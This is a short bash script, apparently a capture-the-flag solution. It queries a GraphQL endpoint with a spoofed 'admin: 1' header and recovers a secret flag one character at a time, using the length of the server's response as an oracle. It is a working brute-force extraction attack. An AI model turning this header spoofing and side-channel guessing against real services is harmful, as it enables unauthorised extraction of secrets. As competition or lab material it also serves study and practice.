query() {
         # "http://199.247.4.207:4000/" \
    curl -H 'admin: 1' \
         -H 'Content-Type: application/graphql' \
         "http://localhost/" \
         --data "@-" \
         2> /dev/null  | jq '.data.checkFlag'
}

get_flag() {
    cat  query.graphql | query
}

echo getting flag length
length=7 #"`| get_flag`"
echo flag length is $length



try_character() {
    local given="$1"
    local length="$2"
    local expected_length="$3"
    for c in 1 2 3 4 5 6 7 8 9 0 a b c d e f g h i j k l m n o p q r s t u v w x y z  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z _; do
        local try="$(printf "%s%0$((24-length))i" "$given$c" 0)"
        # echo "trying $try"
        current_length=$(cat query.graphql | sed 's/000000000000000000000000/'$try'/g' | query)
        echo "CURRENT LENGTH $current_length"
        if [[ $current_length -gt $expected_length ]]; then
            echo "CHARACTER IS $c"
            echo "STR IS $given$c"
            try_character "$given$c" "$length" "$((expected_length + 1))"
            return $?
        fi
    done
    return 1
}

try_character "" 0 "$length"

